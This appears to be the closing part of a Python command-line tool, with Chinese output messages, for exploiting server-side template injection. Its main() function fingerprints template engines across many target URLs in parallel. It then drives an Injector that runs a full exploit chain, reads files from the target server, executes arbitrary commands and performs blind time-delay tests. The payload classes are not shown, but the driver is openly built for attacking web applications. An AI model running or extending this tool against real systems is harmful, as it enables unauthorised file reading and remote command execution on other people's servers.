            eng = s.scan()
            return url, eng

        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futs = {pool.submit(_worker, t): t for t in targets}
            for f in as_completed(futs):
                url, eng = f.result()
                tag = eng.upper() if eng else "N/A"
                print(f"  {url:60s} ➔  {tag}")
        return

    # ── 单目标模式 ──
    if not args.url:
        print("[-] 请指定目标 URL (-u)")
        sys.exit(1)

    if args.scan:
        scanner = FingerScanner(req, args.url, args.param, args.method)
        engine = scanner.scan()
        if engine:
            print(f"[+] 引擎: {engine.upper()}")
        else:
            print("[-] 未识别引擎")

    if args.chain:
        scanner = FingerScanner(req, args.url, args.param, args.method)
        engine = scanner.scan() or "jinja2"
        exploiter = Injector(req, args.url, args.param, engine, args.method, args.burst)
        report = exploiter.full_chain()
        output = json.dumps(report, indent=2, ensure_ascii=False)
        print(output)
        if args.output:
            with open(args.output, "w") as f:
                f.write(output)
            print(f"[+] 结果已保存: {args.output}")

    if args.read:
        scanner = FingerScanner(req, args.url, args.param, args.method)
        engine = scanner.scan() or "jinja2"
        exploiter = Injector(req, args.url, args.param, engine, args.method, args.burst)
        result = exploiter.read_file(args.read)
        if result:
            print(f"[+] 文件内容 ({len(result)} bytes):\n{result}")

    if args.cmd:
        scanner = FingerScanner(req, args.url, args.param, args.method)
        engine = scanner.scan() or "jinja2"
        exploiter = Injector(req, args.url, args.param, engine, args.method, args.burst)
        result = exploiter.run_command(args.cmd)
        if result:
            print(f"[+] 命令输出 ({len(result)} bytes):\n{result}")

    if args.blind:
        scanner = FingerScanner(req, args.url, args.param, args.method)
        engine = scanner.scan() or "jinja2"
        exploiter = Injector(req, args.url, args.param, engine, args.method, args.burst)
        result = exploiter.blind_sleep(args.blind)
        print(f"    期望: {result['expected']}s, 实际: {result['actual']}s, "
              f"状态: {'延时生效' if result['delayed'] else '未生效'}")


if __name__ == "__main__":
    main()
